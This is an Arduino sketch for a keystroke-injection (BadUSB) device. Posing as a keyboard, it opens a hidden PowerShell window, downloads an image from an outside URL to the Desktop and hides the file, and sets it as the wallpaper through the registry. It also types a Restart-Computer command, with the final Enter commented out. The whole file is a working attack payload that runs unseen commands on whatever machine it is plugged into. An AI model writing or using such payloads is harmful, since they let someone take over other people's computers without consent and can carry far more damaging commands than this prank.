#include "my_func.h"
void setup() {
  Keyboard.begin();
}

void loop() {
  delay(2000);
  _run();
  Keyboard.print("powershell -w h ");
  _hitKey(KEY_RETURN);
  Keyboard.print("Start-Process https://i.pcmag.com/imagery/articles/034Ds0HEhPXYGjpU93Ceu5H-4.fit_lim.size_1600x900.v1641502294.jpg");
  _hitKey(KEY_RETURN);
  Keyboard.print("$p=$home+'\\Desktop\\image.jpg';"
  "curl https://i.pcmag.com/imagery/articles/034Ds0HEhPXYGjpU93Ceu5H-4.fit_lim.size_1600x900.v1641502294.jpg -O $p;"
  "(get-item ($home+'\\Desktop\\image.jpg')).Attributes += 'Hidden';"
  "sp 'HKCU:Control panel\\Desktop' Wallpaper $p");
  _hitKey(KEY_RETURN);
  
  Keyboard.print("powershell -w h $p=$home+'\\Desktop\\image.jpg'; sp 'HKCU:Control panel\\Desktop' Wallpaper $p");
  _hitKey(KEY_RETURN);
  delay(2000);
  _run();
  Keyboard.print("powershell -w h");
  _hitKey(KEY_RETURN);
  Keyboard.print("Restart-Computer");
  //_hitKey(KEY_RETURN);

  Keyboard.end();
  exit(0);

}
